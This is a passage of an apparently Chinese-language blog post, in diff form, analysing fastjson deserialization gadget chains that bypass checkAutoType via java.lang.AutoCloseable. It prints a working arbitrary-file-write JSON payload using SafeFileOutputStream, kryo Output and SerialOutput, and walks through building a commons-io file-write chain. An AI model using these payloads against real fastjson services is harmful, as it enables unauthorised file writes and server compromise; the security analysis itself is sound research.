+<p><code>JavaBeanDeserializer#deserialze</code>会调用重载的方法，最后<code>type</code>里面放的是<code>java.lang.AutoCloseable</code>接口，在<code>deserialze</code>方法内还会调用<code>checkAutoType</code>并且<code>expectClass</code>放入的是<code>java.lang.AutoCloseable</code>的class对象、<code>typeName</code>里面放入的是<code>AutoCloseable</code>的实现类，导致后面的绕过。</p>
+<p><img src="/images/20230507171634.png"></p>
+<h2 id="寻找Gadget"><a href="#寻找Gadget" class="headerlink" title="寻找Gadget"></a>寻找Gadget</h2><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ol>
+<li>需要一个通过 set 方法或构造方法指定文件路径的 OutputStream</li>
+<li>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream</li>
+<li>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 flush 方法</li>
+</ol>
+<hr>
+<p>浅蓝师傅的poc：</p>
+<pre><code>&#123;
+    &quot;stream&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
+        &quot;targetPath&quot;: &quot;E:/a/pwn.txt&quot;,
+        &quot;tempPath&quot;: &quot;E:/a/test.txt&quot;
+    &#125;,
+    &quot;writer&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
+        &quot;buffer&quot;: &quot;MWF6eQ==&quot;,
+        &quot;outputStream&quot;: &#123;
+            &quot;$ref&quot;: &quot;$.stream&quot;
+        &#125;,
+        &quot;position&quot;: 4
+    &#125;,
+    &quot;close&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
+        &quot;out&quot;: &#123;
+            &quot;$ref&quot;: &quot;$.writer&quot;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>maven依赖：</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
+    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
+    &lt;version&gt;1.9.5&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;
+    &lt;artifactId&gt;kryo&lt;/artifactId&gt;
+    &lt;version&gt;4.0.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;
+    &lt;artifactId&gt;je&lt;/artifactId&gt;
+    &lt;version&gt;18.3.12&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>那么这个 payload 为什么能成功写入文件呢？主要有以下几个需要注意点：</p>
+<ul>
+<li>AutoCloseable 的接口可以绕过 checkAutoType。</li>
+<li>分别找到了不同的实现类来实现不同的功能：创建文件链接、写入内容、write&#x2F;flush 等。</li>
+<li>使用了 fastjson 的 ref 进行对象引用，把这些类串联起来。</li>
+</ul>
+<p>AutoCloseable 为什么可以绕过 checkAutoType 这里不再重复，在我之前的文章也分析过。</p>
+<p>这里浅蓝找到了三个类分别实现了不同的功能：</p>
+<ul>
+<li><code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code>：用来创建文件链接对象和OutputStream。</li>
+<li><code>com.esotericsoftware.kryo.io.Output</code>：用来向 OutputStream 中写入文件内容。</li>
+<li><code>com.sleepycat.bind.serial.SerialOutput</code>：用来触发 flush 方法将流写回文件中。</li>
+</ul>
+<h4 id="FastJson构造函数"><a href="#FastJson构造函数" class="headerlink" title="FastJson构造函数"></a>FastJson构造函数</h4><p>FastJson反序列化的时候，普通类（不包括接口和抽象类）是通过反射获取构造函数来生成对象的，最后通过反射调用set方法来设置属性的。<br>而获取构造函数的过程又是怎么样的，他是怎么判断要获取哪个构造器的？<br>在<code>ParserConfig#createJavaBeanDeserializer</code>会通过<code>JavaBeanInfo.build</code>生成一个<code>JavaBeanInfo</code>对象，这是FastJson内部存储反序列化对象信息的类。</p>
+<pre><code>public class JavaBeanInfo &#123;
+
+    public final Class&lt;?&gt; clazz;
+    public final Class&lt;?&gt; builderClass;
+    //无参构造方法放在这
+    public final Constructor&lt;?&gt; defaultConstructor;
+     //有参构造方法放在这
+    public final Constructor&lt;?&gt; creatorConstructor;
+    public final Method factoryMethod;
+    public final Method buildMethod;
+</code></pre>
+<p> <code>defaultConstructor</code> 和 <code>creatorConstructor</code> 两个属性，首先看到获取<code>defaultConstructor</code>的方法：</p>
+<pre><code>static Constructor&lt;?&gt; getDefaultConstructor(Class&lt;?&gt; clazz, final Constructor&lt;?&gt;[] constructors) &#123;
+        if (Modifier.isAbstract(clazz.getModifiers())) &#123;
+            return null;
+        &#125;
+
+        Constructor&lt;?&gt; defaultConstructor = null;
+
+        for (Constructor&lt;?&gt; constructor : constructors) &#123;
+            if (constructor.getParameterTypes().length == 0) &#123;
+                defaultConstructor = constructor;
+                break;
+            &#125;
+        &#125;
+        if (defaultConstructor == null) &#123;
+        ...
+        &#125;
+
+        return defaultConstructor;
+&#125;
+</code></pre>
+<p>简单易懂，遍历所有的构造函数，看看其中是否存在无参构造函数，如果存在直接返回。</p>
+<p>再看到<code>creatorConstructor</code>的获取方法：</p>
+<pre><code>for (Constructor constructor : constructors) &#123;
+    Class&lt;?&gt;[] parameterTypes = constructor.getParameterTypes();
+
+    if (className.equals(&quot;org.springframework.security.web.authentication.WebAuthenticationDetails&quot;)) &#123;
+        if (parameterTypes.length == 2 &amp;&amp; parameterTypes[0] == String.class &amp;&amp; parameterTypes[1] == String.class) &#123;
+            creatorConstructor = constructor;
+            creatorConstructor.setAccessible(true);
+            paramNames = ASMUtils.lookupParameterNames(constructor);
+            break;
+        &#125; else &#123;
+            continue;
+        &#125;
+    &#125;
+
+    if (className.equals(&quot;org.springframework.security.web.authentication.preauth.PreAuthenticatedAuthenticationToken&quot;)) &#123;
+        if (parameterTypes.length == 3
+                &amp;&amp; parameterTypes[0] == Object.class
+                &amp;&amp; parameterTypes[1] == Object.class
+                &amp;&amp; parameterTypes[2] == Collection.class) &#123;
+            creatorConstructor = constructor;
+            creatorConstructor.setAccessible(true);
+            paramNames = new String[] &#123;&quot;principal&quot;, &quot;credentials&quot;, &quot;authorities&quot;&#125;;
+            break;
+        &#125; else &#123;
+            continue;
+        &#125;
+    &#125;
+
+    if (className.equals(&quot;org.springframework.security.core.authority.SimpleGrantedAuthority&quot;)) &#123;
+        if (parameterTypes.length == 1
+                &amp;&amp; parameterTypes[0] == String.class) &#123;
+            creatorConstructor = constructor;
+            paramNames = new String[] &#123;&quot;authority&quot;&#125;;
+            break;
+        &#125; else &#123;
+            continue;
+        &#125;
+    &#125;
+
+    //
+
+
+    boolean is_public = (constructor.getModifiers() &amp; Modifier.PUBLIC) != 0;
+    if (!is_public) &#123;
+        continue;
+    &#125;
+    String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor);
+    if (lookupParameterNames == null || lookupParameterNames.length == 0) &#123;
+        continue;
+    &#125;
+
+    if (creatorConstructor != null
+            &amp;&amp; paramNames != null &amp;&amp; lookupParameterNames.length &lt;= paramNames.length) &#123;
+        continue;
+    &#125;
+
+    paramNames = lookupParameterNames;
+    creatorConstructor = constructor;
+    &#125;
+&#125;
+</code></pre>
+<p>前面会先调用<code>getCreatorConstructor</code>，判断构造器上有无JSONCreator注解，有的话就用返回注解的构造器，且注解不能作用多个构造器，没有注解的话进入这个循环，会对构造器和它的参数进行一系列判断，从所有的构造方法中获取参数最多的一个。需要注意的是获取参数名称使用的并不是java8中提供的获取方法参数名称的方式，而是通过流读取class文件的的方式来获取的，在<code>ASMUtils.lookupParameterNames</code>方法中。</p>
+<pre><code>String resourceName = className.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;;
+    InputStream is = classLoader.getResourceAsStream(resourceName);
+
+    if (is == null) &#123;
+        return new String[0];
+    &#125;
+
+    try &#123;
+        ClassReader reader = new ClassReader(is, false);
+        TypeCollector visitor = new TypeCollector(name, types);
+        reader.accept(visitor);
+        String[] parameterNames = visitor.getParameterNamesForMethod();
+</code></pre>
+<p>然后通过构造器的参数名，去获取json中的值，作为构造器实例化的参数值，去实例化构造器（<code>JavaBeanDeserializer#deserialze</code>）</p>
+<pre><code>boolean match = parseField(parser, key, object, type,
+                        fieldValues == null ? new HashMap&lt;String, Object&gt;(this.fieldDeserializers.length) : fieldValues, setFlags);
+...
+params = new Object[size];
+...
+Object param = fieldValues.get(fieldInfo.name);
+params[i] = param;
+...
+object = beanInfo.creatorConstructor.newInstance(params);
+</code></pre>
+<h4 id="SafeFileOutputStream"><a href="#SafeFileOutputStream" class="headerlink" title="SafeFileOutputStream"></a>SafeFileOutputStream</h4><pre><code>public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123;
+    this.failed = false;
+    this.target = new File(targetPath);
+    this.createTempFile(tempPath);
+    if (!this.target.exists()) &#123;
+        if (!this.temp.exists()) &#123;
+            this.output = new BufferedOutputStream(new FileOutputStream(this.target));
+            return;
+        &#125;
+
+        this.copy(this.temp, this.target);
+    &#125;
+
+    this.output = new BufferedOutputStream(new FileOutputStream(this.temp));
+&#125;
+</code></pre>
+<p>在这个两个参数的构造方法中，接收参数 targetPath 和 tempPath。用这两个参数创建对应的File对象，tempPath如果没有传入值会用target的路径再拼接上”.bak”，调用<code>copy</code>方法，创建temp和target的缓冲流，读取temp流中的数据，写入target流中，最后创建了temp的缓冲流，写入this.output属性中</p>
+<pre><code>protected void copy(File sourceFile, File destinationFile) throws IOException &#123;
+    if (sourceFile.exists()) &#123;
+        if (!sourceFile.renameTo(destinationFile)) &#123;
+            InputStream source = null;
+            OutputStream destination = null;
+
+            try &#123;
+                source = new BufferedInputStream(new FileInputStream(sourceFile));
+                destination = new BufferedOutputStream(new FileOutputStream(destinationFile));
+                this.transferStreams(source, destination);
+                destination.close();
+            &#125; finally &#123;
+                FileUtil.safeClose(source);
+                FileUtil.safeClose(destination);
+            &#125;
+
+        &#125;
+    &#125;
+&#125;
+
+protected void transferStreams(InputStream source, OutputStream destination) throws IOException &#123;
+    byte[] buffer = new byte[8192];
+
+    while(true) &#123;
+        int bytesRead = source.read(buffer);
+        if (bytesRead == -1) &#123;
+            return;
+        &#125;
+
+        destination.write(buffer, 0, bytesRead);
+    &#125;
+&#125;
+</code></pre>
+<p>总结：传入一个文件路径，SafeFileOutputStream 就会替我们创建 OutputStream 对象并保存在 <code>this.output</code> 中。利用fastjson实例化有参构造的特性，传入targetPath&#x2F;tempPath 两个参数。</p>
+<h4 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h4><pre><code>public void flush() throws KryoException &#123;
+    if (this.outputStream != null) &#123;
+        try &#123;
+            this.outputStream.write(this.buffer, 0, this.position);
+            this.outputStream.flush();
+        &#125; catch (IOException var2) &#123;
+            throw new KryoException(var2);
+        &#125;
+
+        this.total += (long)this.position;
+        this.position = 0;
+    &#125;
+&#125;
+</code></pre>
+<p>Output的flush方法会调用<code>outputStream</code>属性的write和flush方法，去写入<code>buffer</code>属性,长度为<code>position</code>属性。写入点有了，那么我们该如何触发这个flush方法呢。</p>
+<h4 id="SerialOutput"><a href="#SerialOutput" class="headerlink" title="SerialOutput"></a>SerialOutput</h4><pre><code>public class SerialOutput extends ObjectOutputStream &#123;
+</code></pre>
+<p><code>SerialOutput</code>是<code>ObjectOutputStream</code>的子类，在<code>ObjectOutputStream</code>的一个参数<code>OutputStream out</code>的有参构造中，会调用内部类的<code>setBlockDataMode</code>方法</p>
+<pre><code>public ObjectOutputStream(OutputStream out) throws IOException &#123;
+    verifySubclass();
+    bout = new BlockDataOutputStream(out);
+    handles = new HandleTable(10, (float) 3.00);
+    subs = new ReplaceTable(10, (float) 3.00);
+    enableOverride = false;
+    writeStreamHeader();
+    bout.setBlockDataMode(true);
+    if (extendedDebugInfo) &#123;
+        debugInfoStack = new DebugTraceInfoStack();
+    &#125; else &#123;
+        debugInfoStack = null;
+    &#125;
+&#125;
+</code></pre>
+<p>内部类的<code>setBlockDataMode</code>方法会调用<code>drain()</code>方法</p>
+<pre><code>boolean setBlockDataMode(boolean mode) throws IOException &#123;
+    if (blkmode == mode) &#123;
+        return blkmode;
+    &#125;
+    drain();
+    blkmode = mode;
+    return !blkmode;
+&#125;
+</code></pre>
+<p><code>drain</code>方法中会调用有参构造传入的out的<code>write</code>方法，</p>
+<pre><code>void drain() throws IOException &#123;
+    if (pos == 0) &#123;
+        return;
+    &#125;
+    if (blkmode) &#123;
+        writeBlockHeader(pos);
+    &#125;
+    \\调用调用有参构造传入的out的write方法
+    out.write(buf, 0, pos);
+    pos = 0;
+&#125;
+</code></pre>
+<p>这时会调用Output的<code>public void write(byte[] bytes, int offset, int length)</code>，里面会调用<code>this.writeBytes(bytes, offset, length);</code>，<code>writeBytes</code>方法中会调用<code>require</code>方法，<code>require</code>方法中会调用我们熟悉的<code>flush</code>方法，从而将缓冲流的数据写入。</p>
+<pre><code>public void write(byte[] bytes, int offset, int length) throws KryoException &#123;
+    //调用
+    this.writeBytes(bytes, offset, length);
+&#125;
+
+public void writeBytes(byte[] bytes, int offset, int count) throws KryoException &#123;
+    if (bytes == null) &#123;
+        throw new IllegalArgumentException(&quot;bytes cannot be null.&quot;);
+    &#125; else &#123;
+        int copyCount = Math.min(this.capacity - this.position, count);
+
+        while(true) &#123;
+            System.arraycopy(bytes, offset, this.buffer, this.position, copyCount);
+            this.position += copyCount;
+            count -= copyCount;
+            if (count == 0) &#123;
+                return;
+            &#125;
+
+            offset += copyCount;
+            copyCount = Math.min(this.capacity, count);
+            //调用
+            this.require(copyCount);
+        &#125;
+    &#125;
+&#125;
+
+protected boolean require(int required) throws KryoException &#123;
+    if (this.capacity - this.position &gt;= required) &#123;
+        return false;
+    &#125; else if (required &gt; this.maxCapacity) &#123;
+        throw new KryoException(&quot;Buffer overflow. Max capacity: &quot; + this.maxCapacity + &quot;, required: &quot; + required);
+    &#125; else &#123;
+        //调用flush
+        this.flush();
+        ...
+    &#125;
+&#125;
+</code></pre>
+<p>总结：在<code>SerialOutput</code>的有参构造中传入<code>Output</code>对象，就可以触发他的<code>flush</code>方法。</p>
+<h4 id="fastjson对象引用"><a href="#fastjson对象引用" class="headerlink" title="fastjson对象引用"></a>fastjson对象引用</h4><p>从 fastjson 1.2.36开始，可以通过 <code>$ref</code> 指定被引用的属性。JavaBeanDeserializer 支持 $ref 这种技巧，ThrowableDeserializer 不支持，后者没有parseField() 方法。</p>
+<p>fastjson 默认提供对象引用功能，在传输的数据中出现相同的对象时，fastjson 默认开启引用检测将相同的对象写成引用的形式，对应如下：</p>
+<table>
+<thead>
+<tr>
+<th>引用</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;$ref&quot;:&quot;..&quot;</code></td>
+<td>上一级</td>
+</tr>
+<tr>
+<td><code>&quot;$ref&quot;:&quot;@&quot;</code></td>
+<td>当前对象，也就是自引用</td>
+</tr>
+<tr>
+<td><code>&quot;$ref&quot;:&quot;$&quot;</code></td>
+<td>根对象</td>
+</tr>
+<tr>
+<td><code>&quot;$ref&quot;:&quot;$.children.0&quot;</code></td>
+<td>基于路径的引用，相当于 root.getChildren().get(0)</td>
+</tr>
+</tbody></table>
+<p><img src="/images/20230522175957.png"></p>
+<p>使用 $ref 关键字进行引用的调用，完成 payload 的串联。但是这三个类库一般在真实环境中遇不到。<strong>所以需要找一个更常用的库来寻找利用链</strong>。</p>
+<h3 id="commons-io文件读写"><a href="#commons-io文件读写" class="headerlink" title="commons-io文件读写"></a>commons-io文件读写</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;commons-io&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
+    &lt;version&gt;2.11.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h4 id="CharSequenceInputStream"><a href="#CharSequenceInputStream" class="headerlink" title="CharSequenceInputStream"></a>CharSequenceInputStream</h4><pre><code>public CharSequenceInputStream(final CharSequence s, final String charset, int bufferSize) &#123;
+    this(s, Charset.forName(charset), bufferSize);
+&#125;
+
+public CharSequenceInputStream(final CharSequence s, final Charset charset, int bufferSize) &#123;
+    super();
+    this.encoder = charset.newEncoder()
+        .onMalformedInput(CodingErrorAction.REPLACE)
+        .onUnmappableCharacter(CodingErrorAction.REPLACE);
+    this.bbuf = ByteBuffer.allocate(bufferSize);
+    this.bbuf.flip();
+    this.cbuf = CharBuffer.wrap(s);
+    this.mark = -1;
+&#125;
+</code></pre>
+<p>构造方法接收参数 CharSequence 对象(s)、字符编码(charset)、字节大小(bufferSize)，并初始化放在类属性中。CharSequence 是 String 的父接口，我们使用 String 对象的数据即可。<br>由于这个类接收 CharSequence 对象，可以充当我们写入文件内容的入口类。写入的内容会放在 this.cbuf 中，这是一个 CharBuffer 对象。</p>
+<p>使用如下 json 反序列化 CharSequenceInputStream 对象：</p>
+<pre><code>&#123;
+    &quot;charSequenceInputStream&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceInputStream&quot;,
+        &quot;charset&quot;: &quot;UTF-8&quot;,
+        &quot;bufferSize&quot;: 1,
+        &quot;s&quot;: &#123;
+            &quot;@type&quot;: &quot;java.lang.String&quot;&quot;aaa&quot;
+        &#125;
+    &#125;
+</code></pre>
+<p>需要注意的是传递<code>&quot;@type&quot;: &quot;java.lang.String&quot;&quot;aaa&quot;</code>的时候没有按照json格式化，这是因为fastjson的特性：读取 token 时采取了基于预测的方式，也就是根据当前解析情况指定下一个 token 的期望字符。<br>在处理 String 类型的反序列化器 StringCodec 中，会继续读取字符串类型的 token，并返回结果。<br><img src="/images/20230522201443.png"></p>
+<h4 id="FileWriterWithEncoding"><a href="#FileWriterWithEncoding" class="headerlink" title="FileWriterWithEncoding"></a>FileWriterWithEncoding</h4><p>这个类构造方法接收 file 参数、encoding 参数，创建 File 对象，并调用 initWriter 方法初始化 OutputStreamWriter 方法放在 <code>this.out</code> 中。</p>
+<pre><code>public FileWriterWithEncoding(String filename, CharsetEncoder encoding) throws IOException &#123;
+    this(new File(filename), encoding, false);
+&#125;
+
+public FileWriterWithEncoding(File file, CharsetEncoder encoding, boolean append) throws IOException &#123;
+    super();
+    this.out = initWriter(file, encoding, append);
+&#125;
+
+ private static Writer initWriter(File file, Object encoding, boolean append) throws IOException &#123;
+    if (file == null) &#123;
+        throw new NullPointerException(&quot;File is missing&quot;);
+    &#125;
+    if (encoding == null) &#123;
+        throw new NullPointerException(&quot;Encoding is missing&quot;);
+    &#125;
+    boolean fileExistedAlready = file.exists();
+    OutputStream stream = null;
+    Writer writer = null;
+    try &#123;
+        stream = new FileOutputStream(file, append);
+        if (encoding instanceof Charset) &#123;
+            writer = new OutputStreamWriter(stream, (Charset)encoding);
+        &#125; else if (encoding instanceof CharsetEncoder) &#123;
+            writer = new OutputStreamWriter(stream, (CharsetEncoder)encoding);
+        &#125; else &#123;
+            writer = new OutputStreamWriter(stream, (String)encoding);
+        &#125;
+    &#125; catch (IOException ex) &#123;
+        IOUtils.closeQuietly(writer);
+        IOUtils.closeQuietly(stream);
+        if (fileExistedAlready == false) &#123;
+            FileUtils.deleteQuietly(file);
+        &#125;
+        throw ex;
+    &#125; catch (RuntimeException ex) &#123;
+        IOUtils.closeQuietly(writer);
+        IOUtils.closeQuietly(stream);
+        if (fileExistedAlready == false) &#123;
+            FileUtils.deleteQuietly(file);
+        &#125;
+        throw ex;
+    &#125;
+    return writer;
+&#125;
+</code></pre>
+<p>使用如下 json 反序列化 writer 对象：</p>
+<pre><code>&#123;
+    &quot;writer&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,
+        &quot;file&quot;: &quot;/Users/phoebe/Downloads/1.txt&quot;,
+        &quot;encoding&quot;: &quot;UTF-8&quot;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="WriterOutputStream"><a href="#WriterOutputStream" class="headerlink" title="WriterOutputStream"></a>WriterOutputStream</h4><pre><code>public WriterOutputStream(Writer writer, String charsetName, int bufferSize, boolean writeImmediately) &#123;
+    this(writer, Charset.forName(charsetName), bufferSize, writeImmediately);
+&#125;
+public WriterOutputStream(Writer writer, CharsetDecoder decoder, int bufferSize, boolean writeImmediately) &#123;
+    this.writer = writer;
+    this.decoder = decoder;
+    this.writeImmediately = writeImmediately;
+    decoderOut = CharBuffer.allocate(bufferSize);
+&#125;
+</code></pre>
+<p>WriterOutputStream 的构造方法接收参数 Writer(writer)、字符编码(charsetName)、字节大小(bufferSize)、标识是否立即写入的布尔型参数(writeImmediately)。然后将这些参数在 WriterOutputStream 初始化。</p>
+<pre><code>@Override
+public void write(byte[] b, int off, int len) throws IOException &#123;
+    while (len &gt; 0) &#123;
+        int c = Math.min(len, decoderIn.remaining());
+        decoderIn.put(b, off, c);
+        processInput(false);
+        len -= c;
+        off += c;
+    &#125;
+    if (writeImmediately) &#123;
+        flushOutput();
+    &#125;
+&#125;
+</code></pre>
+<p><code>write</code>方法可以将参数中的byte数组b通过 <code>this.decoderIn</code> 的 put 方法写入，使用 <code>this.processInput</code> 方法将 in 和 out 数据进行拷贝，并在 <code>this.flushOutput</code> 方法中调用 writer 的 write 方法写出 <code>this.decoderOut</code> 中的数据。</p>
+<p>总结：WriterOutputStream 的 write 方法会调用 writer 将接受到的字节数据写出去。</p>
+<p>使用如下 json 反序列化 WriterOutputStream 对象：</p>
+<pre><code>&#123;
+    &quot;writerOutputStream&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,
+        &quot;writeImmediately&quot;: true,
+        &quot;bufferSize&quot;: 1,
+        &quot;charsetName&quot;: &quot;UTF-8&quot;,
+        &quot;writer&quot;: &#123;writer对象&#125;
+    &#125;
+&#125;
+</code></pre>
+<p>现在我们有了接收输入（文件内容）的 InputStream，负责输出的 OutputStream 和 Writer（文件路径），接下来我们还需要找到将 InputStream 和 OutputStream 进行转换，以及触发写出文件操作。</p>
+<h4 id="TeeInputStream"><a href="#TeeInputStream" class="headerlink" title="TeeInputStream"></a>TeeInputStream</h4><p><code>org.apache.commons.io.input.TeeInputStream</code>：接收 InputStream 及 OutputStream，并提供将 InputStream 中的字节写入 OutputStream 的功能，以及提供调用两者 close 的功能。</p>
+<pre><code>public TeeInputStream(
+        InputStream input, OutputStream branch, boolean closeBranch) &#123;
+    super(input);
+    this.branch = branch;
+    this.closeBranch = closeBranch;
+&#125;
+
+
+protected FilterInputStream(InputStream in) &#123;
+    this.in = in;
+&#125;
+</code></pre>
+<p>TeeInputStream 是 FilterInputStream 的子类，会在构造方法中会把 InputStream 放在 <code>this.in</code> 中。</p>
+<p>TeeInputStream 的 <code>read</code> 方法会调用其父类 ProxyInputStream 的对应 read 方法读取 <code>this.in</code> 中的内容，并调用 <code>this.branch</code> 中的 OutputStream 对象的 write 方法进行写入。</p>
+<pre><code>@Override
+public int read() throws IOException &#123;
+    int ch = super.read();
+    if (ch != -1) &#123;
+        branch.write(ch);
+    &#125;
+    return ch;
+&#125;
+
+@Override
+public int read(byte[] bts, int st, int end) throws IOException &#123;
+    int n = super.read(bts, st, end);
+    if (n != -1) &#123;
+        branch.write(bts, st, n);
+    &#125;
+    return n;
+&#125;
+</code></pre>
+<p>使用如下 json 反序列化 TeeInputStream 对象：</p>
+<pre><code>&#123;
+    &quot;teeInputStream&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,
+        &quot;input&quot;: &#123;InputStream 对象&#125;,
+        &quot;branch&quot;: &#123;OutputStream 对象&#125;,
+        &quot;closeBranch&quot;: true
+    &#125;
+&#125;
+</code></pre>
+<h3 id="BOMInputStream"><a href="#BOMInputStream" class="headerlink" title="BOMInputStream"></a>BOMInputStream</h3><p><code>org.apache.commons.io.input.BOMInputStream</code>：调用 InputStream 的 read 方法读取字节。</p>
+<p>这个类是 commons-io 用来检测文件输入流的 BOM 并在输入流中进行过滤，根据 <code>org.apache.commons.io.ByteOrderMark</code> 中的属性。</p>
+<p>BOMInputStream 与 TeeInputStream 同继承了父类 ProxyInputStream，其初始化参数 delegate 接收 InputStream，使用父类构造方法放入 <code>this.in</code> 中，boms 是 ByteOrderMark 类的可变参数数组，用来指定不同编码的 BOM 头部，会处理成 List 对象存入 <code>this.boms</code> 中。</p>
+<pre><code>public BOMInputStream(InputStream delegate, boolean include, ByteOrderMark... boms) &#123;
+    super(delegate);
+    if (boms == null || boms.length == 0) &#123;
+        throw new IllegalArgumentException(&quot;No BOMs specified&quot;);
+    &#125;
+    this.include = include;
+    // Sort the BOMs to match the longest BOM first because some BOMs have the same starting two bytes.
+    Arrays.sort(boms, ByteOrderMarkLengthComparator);
+    this.boms = Arrays.asList(boms);
+
+&#125;
+</code></pre>
+<p>ByteOrderMark 就是 commons-io 包对流中 BOM 头部的封装，这个类接收 charsetName 和名为 bytes 的可变参数 int 数组，这个 int 数组用来表示不同编码的字节顺序标记的表示：</p>
+<pre><code>public ByteOrderMark(String charsetName, int... bytes) &#123;
+    if (charsetName == null || charsetName.length() == 0) &#123;
+        throw new IllegalArgumentException(&quot;No charsetName specified&quot;);
+    &#125;
+    if (bytes == null || bytes.length == 0) &#123;
+        throw new IllegalArgumentException(&quot;No bytes specified&quot;);
+    &#125;
+    this.charsetName = charsetName;
+    this.bytes = new int[bytes.length];
+    System.arraycopy(bytes, 0, this.bytes, 0, bytes.length);
+&#125;
+</code></pre>
+<p>BOMInputStream 中存在一个 <code>getBOM()</code> 方法，这个方法原本的作用就是根据类初始化时传入的 InputStream 对象以及 ByteOrderMark 配置，在流中读取对应的 ByteOrderMark。</p>
+<pre><code>public ByteOrderMark getBOM() throws IOException &#123;
+    if (firstBytes == null) &#123;
+        fbLength = 0;
+        // BOMs are sorted from longest to shortest
+        final int maxBomSize = boms.get(0).length();
+        firstBytes = new int[maxBomSize];
+        // Read first maxBomSize bytes
+        for (int i = 0; i &lt; firstBytes.length; i++) &#123;
+            firstBytes[i] = in.read();
+            fbLength++;
+            if (firstBytes[i] &lt; 0) &#123;
+                break;
+            &#125;
+        &#125;
+        // match BOM in firstBytes
+        byteOrderMark = find();
+        if (byteOrderMark != null) &#123;
+            if (!include) &#123;
+                if (byteOrderMark.length() &lt; firstBytes.length) &#123;
+                    fbIndex = byteOrderMark.length();
+                &#125; else &#123;
+                    fbLength = 0;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+    return byteOrderMark;
+&#125;
+</code></pre>
+<p>这个方法创建了一个 for 循环，根据类初始化时的 ByteOrderMark 的 int 数组长度，调用 <code>this.in</code> 的 read 方法在流中循环读取相应长度的数据。</p>
+<p>使用如下 json 反序列化 BOMInputStream 对象：</p>
+<pre><code>&#123;
+    &quot;bOMInputStream&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
+        &quot;delegate&quot;: &#123;InputStream 对象&#125;,
+        &quot;boms&quot;: [&#123;
+            &quot;charsetName&quot;: &quot;UTF-8&quot;,
+            &quot;bytes&quot;: [0, 0, 0, 0]
+        &#125;]
+    &#125;
+&#125;
+</code></pre>
+<h4 id="GETTER-方法调用"><a href="#GETTER-方法调用" class="headerlink" title="GETTER 方法调用"></a>GETTER 方法调用</h4><p>这个 BOMInputStream 的 <code>getBOM</code> 方法就是触发这条 gadget 的方法，我们结合上面的全部分析一起看一下：</p>
+<ul>
+<li>BOMInputStream 初始化一个 TeeInputStream 和一个 ByteOrderMark 数组，里面存放了一个指定长度的 int 数组，用来读取相应长度的输入流；</li>
+<li>TeeInputStream 初始化了一个 CharSequenceInputStream 和 WriterOutputStream，无论调用 TeeInputStream 的任意一个 read 方法，都会将读取的内容同步调用 WriterOutputStream 的 write 方法写入其中；</li>
+<li>CharSequenceInputStream 初始化输入的字符串（实际上是 CharSequence 对象）、字符编码、以及缓冲区大小（最大 255）用于创建 InputStream 对象；</li>
+<li>WriterOutputStream 初始化 FileWriterWithEncoding 以及一些属性，WriterOutputStream 的 write 方法会将字节进行写入，如果参数 writeImmediately 为 true，会调用 OutputStreamWriter 的 write 方法进行写出。</li>
+</ul>
+<p>以上过程使用代码正向调用的话，过程如下，可成功创建文件：</p>
+<pre><code>CharSequenceInputStream inputStream    = new CharSequenceInputStream(&quot;aaaa&quot;, &quot;UTF-8&quot;, 4);
+FileWriterWithEncoding  fileWriter     = new FileWriterWithEncoding(&quot;/Users/phoebe/Downloads/12.txt&quot;, &quot;UTF-8&quot;, false);
+WriterOutputStream      outputStream   = new WriterOutputStream(fileWriter, &quot;UTF-8&quot;, 4, true);
+TeeInputStream          teeInputStream = new TeeInputStream(inputStream, outputStream, true);
+ByteOrderMark           byteOrderMark  = new ByteOrderMark(&quot;UTF-8&quot;, new int[]&#123;0, 0, 0, 0&#125;);
+BOMInputStream          bomInputStream = new BOMInputStream(teeInputStream, byteOrderMark);
